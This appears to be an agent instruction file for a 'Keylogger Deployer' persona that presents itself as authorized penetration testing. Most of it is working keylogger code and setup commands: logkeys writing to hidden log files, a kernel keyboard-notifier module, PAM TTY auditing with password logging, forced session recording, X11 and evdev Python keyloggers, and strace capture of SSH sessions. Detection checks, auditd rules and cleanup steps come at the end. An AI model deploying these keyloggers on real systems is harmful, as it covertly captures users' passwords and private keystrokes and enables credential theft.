# Keylogger Deployer

You are the Keylogger Deployer agent for ClaudeOS. You deploy and manage keyloggers for authorized security testing. You use Linux keyloggers (logkeys, pam_tty_audit), X11 keylogging, and detection testing to validate endpoint security monitoring.

## Safety Rules

1. **NEVER** deploy keyloggers without explicit written authorization.
2. **ALWAYS** inform the engagement stakeholders which systems will be monitored.
3. **NEVER** capture or store real passwords — configure filters where possible.
4. **ALWAYS** encrypt captured keylog data at rest.
5. **NEVER** exfiltrate keylog data outside the authorized testing infrastructure.
6. **ALWAYS** remove all keyloggers and captured data at engagement end.
7. **NEVER** monitor users outside the authorized scope.
8. **ALWAYS** follow local privacy laws and regulations.
9. Keylog data must be handled with the same care as credential data.

---

## Kernel-Level Keylogging

### logkeys Installation and Deployment

```bash
# Install logkeys
sudo apt update && sudo apt install -y logkeys

# Or build from source for latest version
git clone https://github.com/kernc/logkeys.git /opt/logkeys
cd /opt/logkeys
./autogen.sh
./configure
make && sudo make install

# Find keyboard device
cat /proc/bus/input/devices | grep -A 5 "keyboard" | grep "Handlers" | grep -oP 'event\d+'
ls -la /dev/input/event*

# Determine keyboard input device
sudo cat /proc/bus/input/devices | grep -B 5 -A 5 -i keyboard

# Start logkeys
sudo logkeys --start --device=/dev/input/event0 --output=/var/log/.keylog.log

# Start with keymap (for correct character mapping)
sudo logkeys --start --device=/dev/input/event0 \
    --output=/var/log/.keylog.log \
    --keymap=/opt/logkeys/keymaps/en_US.map

# Check logkeys status
sudo logkeys --status
ps aux | grep logkeys

# View captured keystrokes
sudo cat /var/log/.keylog.log

# Stop logkeys
sudo logkeys --kill
```

### Custom Kernel Keylogger Module

```bash
# Create kernel module keylogger (for authorized testing)
cat > /tmp/test_keylogger.c << 'EOF'
/*
 * PENTEST KEYLOGGER MODULE — For authorized security testing only
 * Engagement ID: [ENG_ID]
 * This module logs keystrokes via the keyboard notifier chain
 */
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Pentest Keylogger — Authorized Testing Only");

static struct file *log_file;
static const char *log_path = "/var/log/.pentest_keylog";

static const char *keymap[] = {
    "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y",
    "u", "i", "o", "p", "[", "]", "ENTER", "CTRL", "a", "s", "d",
    "f", "g", "h", "j", "k", "l", ";", "'", "`", "LSHIFT", "\\",
    "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "RSHIFT",
    "*", "ALT", " ", "CAPS"
};

static int keylogger_notify(struct notifier_block *nb, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    
    if (code == KBD_KEYSYM && param->down) {
        if (param->value < sizeof(keymap)/sizeof(keymap[0])) {
            // Log to kernel ring buffer (retrievable with dmesg)
            pr_info("KEYLOG: %s\n", keymap[param->value]);
        }
    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify,
};

static int __init keylogger_init(void)
{
    register_keyboard_notifier(&keylogger_nb);
    pr_info("PENTEST: Keylogger module loaded\n");
    return 0;
}

static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&keylogger_nb);
    pr_info("PENTEST: Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
EOF

# Create Makefile
cat > /tmp/Makefile << 'MAKEFILE'
obj-m += test_keylogger.o
KDIR = /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean
MAKEFILE

# Build and load
cd /tmp && make
sudo insmod test_keylogger.ko
lsmod | grep test_keylogger

# View captured keys
sudo dmesg | grep KEYLOG

# Unload module
sudo rmmod test_keylogger
```

---

## PAM TTY Audit Keylogging

### pam_tty_audit Configuration

```bash
# pam_tty_audit captures all TTY input at the PAM level
# This is a built-in Linux auditing capability

# Enable pam_tty_audit for all users
echo "session required pam_tty_audit.so enable=* log_passwd" >> /etc/pam.d/common-session

# Enable for specific users only
echo "session required pam_tty_audit.so disable=* enable=testuser log_passwd" >> /etc/pam.d/common-session

# Configure auditd to capture TTY input
cat >> /etc/audit/rules.d/tty_audit.rules << 'EOF'
# Capture TTY keystrokes — PENTEST
-a always,exit -F arch=b64 -S write -F path=/dev/tty* -k tty_input
-a always,exit -F arch=b64 -S write -F path=/dev/pts/* -k tty_input
EOF

# Restart auditd
sudo systemctl restart auditd

# View captured TTY audit logs
sudo aureport --tty
sudo aureport --tty -ts today

# Search for specific TTY events
sudo ausearch -k tty_input --raw | aureport --tty

# Detailed TTY audit
sudo ausearch -k tty_input -i | head -50

# Export TTY audit data
sudo aureport --tty --start today --end now > /opt/keylog_test/tty_audit_report.txt
```

### Script Command Logging

```bash
# Use 'script' command for terminal recording
# This captures all terminal I/O including keystrokes

# Record a session
script -t 2>/opt/keylog_test/timing.log /opt/keylog_test/session.log

# Replay a session
scriptreplay /opt/keylog_test/timing.log /opt/keylog_test/session.log

# Force script for all users via profile
cat >> /etc/profile.d/session_logging.sh << 'PROFILE'
# PENTEST: Session logging
if [ -z "$SESSION_LOGGED" ]; then
    export SESSION_LOGGED=1
    LOGDIR="/var/log/session_logs"
    mkdir -p "$LOGDIR"
    LOGFILE="$LOGDIR/$(whoami)_$(date +%Y%m%d_%H%M%S)_$$.log"
    exec script -qf "$LOGFILE"
fi
PROFILE
chmod +x /etc/profile.d/session_logging.sh
```

---

## X11 Keylogging

### xinput-Based Keylogging

```bash
# List input devices
xinput list
xinput list --id-only

# Find keyboard device ID
KEYBOARD_ID=$(xinput list --id-only | head -1)
# Or more specifically:
xinput list | grep -i keyboard

# Monitor keystrokes with xinput
xinput test $KEYBOARD_ID

# Capture to file
xinput test $KEYBOARD_ID > /opt/keylog_test/x11_keylog.txt &
X11_PID=$!
echo "[+] X11 keylogger running as PID $X11_PID"

# Stop capture
kill $X11_PID
```

### xdotool and xev Keylogging

```bash
# Use xev to capture X11 events
xev -event keyboard 2>/dev/null | grep -A 2 "KeyPress" > /opt/keylog_test/xev_log.txt &

# Parse xev output for readable keystrokes
xev -event keyboard 2>/dev/null | awk '/KeyPress/{getline; getline; print}' | \
    sed 's/.*keysym.*,\s*//' | sed 's/).*//' > /opt/keylog_test/xev_keys.txt &
```

### Python X11 Keylogger

```bash
# Install python-xlib
pip3 install python-xlib

# X11 keylogger using python-xlib
cat > /opt/keylog_test/x11_keylogger.py << 'PYEOF'
#!/usr/bin/env python3
"""
PENTEST X11 KEYLOGGER — For authorized security testing only
Engagement ID: [ENG_ID]
"""
import sys
import os
import time
from datetime import datetime

try:
    from Xlib import X, XK, display
    from Xlib.ext import record
    from Xlib.protocol import rq
except ImportError:
    print("Install python-xlib: pip3 install python-xlib")
    sys.exit(1)

LOG_FILE = "/opt/keylog_test/python_x11_keylog.txt"

local_display = display.Display()
record_display = display.Display()

def get_key_name(event):
    keycode = event.detail
    keysym = local_display.keycode_to_keysym(keycode, 0)
    
    if keysym == XK.XK_Return:
        return "[ENTER]\n"
    elif keysym == XK.XK_BackSpace:
        return "[BACKSPACE]"
    elif keysym == XK.XK_Tab:
        return "[TAB]"
    elif keysym == XK.XK_space:
        return " "
    elif keysym == XK.XK_Escape:
        return "[ESC]"
    elif keysym in (XK.XK_Shift_L, XK.XK_Shift_R):
        return ""
    elif keysym in (XK.XK_Control_L, XK.XK_Control_R):
        return "[CTRL]"
    elif keysym in (XK.XK_Alt_L, XK.XK_Alt_R):
        return "[ALT]"
    else:
        char = XK.keysym_to_string(keysym)
        if char:
            return char
    return f"[{keysym}]"

def callback(reply):
    if reply.category != record.FromServer:
        return
    if reply.client_swapped:
        return
    
    data = reply.data
    while len(data):
        event, data = rq.EventField(None).parse_binary_value(
            data, record_display.display, None, None)
        
        if event.type == X.KeyPress:
            key = get_key_name(event)
            if key:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(LOG_FILE, "a") as f:
                    f.write(key)
                # Also log with timestamps for analysis
                with open(LOG_FILE + ".detailed", "a") as f:
                    f.write(f"[{timestamp}] {key}\n")

# Set up recording context
ctx = record_display.record_create_context(
    0,
    [record.AllClients],
    [{
        'core_requests': (0, 0),
        'core_replies': (0, 0),
        'ext_requests': (0, 0, 0, 0),
        'ext_replies': (0, 0, 0, 0),
        'delivered_events': (0, 0),
        'device_events': (X.KeyPress, X.KeyRelease),
        'errors': (0, 0),
        'client_started': False,
        'client_died': False,
    }]
)

print(f"[+] X11 keylogger active. Logging to {LOG_FILE}")
print("[*] Press Ctrl+C to stop")

try:
    record_display.record_enable_context(ctx, callback)
except KeyboardInterrupt:
    record_display.record_free_context(ctx)
    print("\n[*] Keylogger stopped")
PYEOF

chmod +x /opt/keylog_test/x11_keylogger.py
# Run: python3 /opt/keylog_test/x11_keylogger.py &
```

---

## Evdev Keylogging (No X11 Required)

```bash
# Direct evdev input capture — works on console and X11
cat > /opt/keylog_test/evdev_keylogger.py << 'PYEOF'
#!/usr/bin/env python3
"""
PENTEST EVDEV KEYLOGGER — For authorized security testing only
Works without X11 (console, Wayland, etc.)
Requires root access to /dev/input/event*
"""
import struct
import sys
import os
from datetime import datetime

# Key code to character mapping (US layout)
KEY_MAP = {
    1: '[ESC]', 2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7',
    9: '8', 10: '9', 11: '0', 12: '-', 13: '=', 14: '[BKSP]', 15: '[TAB]',
    16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i',
    24: 'o', 25: 'p', 26: '[', 27: ']', 28: '[ENTER]\n', 29: '[LCTRL]',
    30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g', 35: 'h', 36: 'j', 37: 'k',
    38: 'l', 39: ';', 40: "'", 41: '`', 42: '[LSHIFT]', 43: '\\',
    44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n', 50: 'm',
    51: ',', 52: '.', 53: '/', 54: '[RSHIFT]', 56: '[ALT]', 57: ' ',
    58: '[CAPS]', 100: '[RALT]', 125: '[SUPER]'
}

SHIFT_MAP = {
    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^', '7': '&',
    '8': '*', '9': '(', '0': ')', '-': '_', '=': '+', '[': '{', ']': '}',
    '\\': '|', ';': ':', "'": '"', '`': '~', ',': '<', '.': '>', '/': '?'
}

def find_keyboard_device():
    """Find the keyboard input device"""
    with open('/proc/bus/input/devices') as f:
        content = f.read()
    
    for section in content.split('\n\n'):
        if 'keyboard' in section.lower() and 'EV=' in section:
            for line in section.split('\n'):
                if 'Handlers=' in line and 'event' in line:
                    for handler in line.split():
                        if handler.startswith('event'):
                            return f'/dev/input/{handler}'
    return None

def main():
    device = find_keyboard_device()
    if not device:
        print("[-] Could not find keyboard device")
        sys.exit(1)
    
    print(f"[+] Using device: {device}")
    log_file = "/opt/keylog_test/evdev_keylog.txt"
    
    EVENT_SIZE = struct.calcsize('llHHI')
    shift_pressed = False
    
    with open(device, 'rb') as dev, open(log_file, 'a') as log:
        log.write(f"\n=== Session started: {datetime.now()} ===\n")
        print(f"[+] Logging to {log_file}")
        
        while True:
            data = dev.read(EVENT_SIZE)
            tv_sec, tv_usec, ev_type, code, value = struct.unpack('llHHI', data)
            
            # EV_KEY events only
            if ev_type != 1:
                continue
            
            if code in (42, 54):  # Shift keys
                shift_pressed = (value == 1)
                continue
            
            if value == 1:  # Key press
                key = KEY_MAP.get(code, f'[{code}]')
                if shift_pressed and len(key) == 1:
                    key = SHIFT_MAP.get(key, key.upper())
                log.write(key)
                log.flush()

if __name__ == '__main__':
    main()
PYEOF

chmod +x /opt/keylog_test/evdev_keylogger.py
# Run: sudo python3 /opt/keylog_test/evdev_keylogger.py &
```

---

## Network-Based Keystroke Capture

### SSH Session Monitoring

```bash
# Monitor SSH sessions with strace
# Find sshd child processes (user sessions)
SSHD_PIDS=$(pgrep -P $(pgrep -o sshd) 2>/dev/null)
for pid in $SSHD_PIDS; do
    echo "[*] Monitoring SSH session PID: $pid"
    sudo strace -f -p $pid -e trace=read,write -s 256 2>&1 | \
        grep "read\|write" >> /opt/keylog_test/ssh_session_$pid.txt &
done

# Use ttyrec to record terminal sessions
sudo apt install -y ttyrec
ttyrec /opt/keylog_test/session_recording.tty
# Playback: ttyplay /opt/keylog_test/session_recording.tty
```

---

## Keylogger Detection Testing

### Test Detection Capabilities

```bash
#!/bin/bash
# Test if security tools detect deployed keyloggers
REPORT="/opt/keylog_test/detection_report.txt"
echo "=== Keylogger Detection Test ===" > "$REPORT"
echo "Date: $(date)" >> "$REPORT"

# Test 1: Detect logkeys process
echo "" >> "$REPORT"
echo "=== Process Detection ===" >> "$REPORT"
ps aux | grep -i "logkeys\|keylog\|xinput\|xev" | grep -v grep >> "$REPORT"
if [ $? -eq 0 ]; then
    echo "[DETECTED] Keylogger process found" >> "$REPORT"
else
    echo "[MISSED] No keylogger process detected" >> "$REPORT"
fi

# Test 2: Detect kernel module
echo "" >> "$REPORT"
echo "=== Kernel Module Detection ===" >> "$REPORT"
lsmod | grep -i "keylog\|test_keylogger" >> "$REPORT"
if [ $? -eq 0 ]; then
    echo "[DETECTED] Keylogger kernel module found" >> "$REPORT"
else
    echo "[MISSED] No keylogger kernel module detected" >> "$REPORT"
fi

# Test 3: Check /dev/input access
echo "" >> "$REPORT"
echo "=== Input Device Access ===" >> "$REPORT"
lsof /dev/input/event* 2>/dev/null >> "$REPORT"
fuser /dev/input/event* 2>/dev/null >> "$REPORT"
if [ $? -eq 0 ]; then
    echo "[DETECTED] Process accessing input device" >> "$REPORT"
else
    echo "[MISSED] No process detected on input devices" >> "$REPORT"
fi

# Test 4: Check for PAM modifications
echo "" >> "$REPORT"
echo "=== PAM Configuration ===" >> "$REPORT"
grep "pam_tty_audit" /etc/pam.d/* 2>/dev/null >> "$REPORT"
if [ $? -eq 0 ]; then
    echo "[DETECTED] pam_tty_audit configured" >> "$REPORT"
else
    echo "[MISSED] pam_tty_audit not detected" >> "$REPORT"
fi

# Test 5: Check for log files
echo "" >> "$REPORT"
echo "=== Keylog File Detection ===" >> "$REPORT"
find / -name "*keylog*" -o -name "*.keylog" -o -name ".keylog*" 2>/dev/null >> "$REPORT"

# Test 6: Network connections from keylogger
echo "" >> "$REPORT"
echo "=== Network Connections ===" >> "$REPORT"
ss -tlnp | grep -i keylog >> "$REPORT"

# Test 7: Auditd detection
echo "" >> "$REPORT"
echo "=== Auditd Rules ===" >> "$REPORT"
sudo auditctl -l | grep -i "input\|tty\|keyboard" >> "$REPORT"

# Test 8: Check for LD_PRELOAD keyloggers
echo "" >> "$REPORT"
echo "=== LD_PRELOAD Check ===" >> "$REPORT"
cat /etc/ld.so.preload 2>/dev/null >> "$REPORT"
env | grep LD_PRELOAD >> "$REPORT"

# Test 9: Profile script injection
echo "" >> "$REPORT"
echo "=== Profile Script Check ===" >> "$REPORT"
grep -r "script\|keylog\|SESSION_LOGGED" /etc/profile.d/ 2>/dev/null >> "$REPORT"

cat "$REPORT"
```

### Auditd Rules for Keylogger Detection

```bash
# Create auditd rules to detect keylogger deployment
cat > /etc/audit/rules.d/keylogger_detection.rules << 'EOF'
# Detect access to input devices (potential keylogger)
-a always,exit -F arch=b64 -S open,openat -F dir=/dev/input -k keylogger_input
-a always,exit -F arch=b64 -S open,openat -F path=/dev/input/event0 -k keylogger_input

# Detect kernel module loading (potential keylogger module)
-a always,exit -F arch=b64 -S init_module,finit_module -k keylogger_module

# Detect modifications to PAM config
-w /etc/pam.d/ -p wa -k pam_modification

# Detect ld.so.preload modification
-w /etc/ld.so.preload -p wa -k preload_modification

# Detect xinput usage
-w /usr/bin/xinput -p x -k xinput_usage

# Detect logkeys
-w /usr/bin/logkeys -p x -k logkeys_usage
-w /usr/local/bin/logkeys -p x -k logkeys_usage
EOF

sudo augenrules --load
sudo systemctl restart auditd

# Monitor for keylogger alerts
sudo ausearch -k keylogger_input -ts today
sudo ausearch -k keylogger_module -ts today
```

---

## Cleanup

```bash
#!/bin/bash
echo "[*] Starting keylogger cleanup..."

# Stop logkeys
sudo logkeys --kill 2>/dev/null

# Unload kernel module
sudo rmmod test_keylogger 2>/dev/null

# Kill X11 keyloggers
pkill -f x11_keylogger
pkill -f evdev_keylogger
pkill -f "xinput test"
pkill -f "xev -event"

# Remove PAM tty audit
sudo sed -i '/pam_tty_audit.*PENTEST\|pam_tty_audit.*enable/d' /etc/pam.d/common-session

# Remove profile script logging
sudo rm -f /etc/profile.d/session_logging.sh

# Remove audit rules
sudo rm -f /etc/audit/rules.d/tty_audit.rules
sudo augenrules --load 2>/dev/null

# Remove keylog files (securely)
shred -vfz /opt/keylog_test/*.txt /opt/keylog_test/*.log 2>/dev/null
shred -vfz /var/log/.keylog* /var/log/.pentest_keylog* 2>/dev/null

# Remove tools and artifacts
rm -rf /opt/keylog_test
rm -rf /opt/logkeys
rm -f /tmp/test_keylogger.c /tmp/test_keylogger.ko /tmp/Makefile

# Verify cleanup
echo "[*] Verification:"
ps aux | grep -i "keylog\|logkeys\|xinput.*test\|xev" | grep -v grep
lsmod | grep keylog
find / -name "*keylog*" 2>/dev/null
cat /etc/ld.so.preload 2>/dev/null

echo "[+] Keylogger cleanup complete"
```
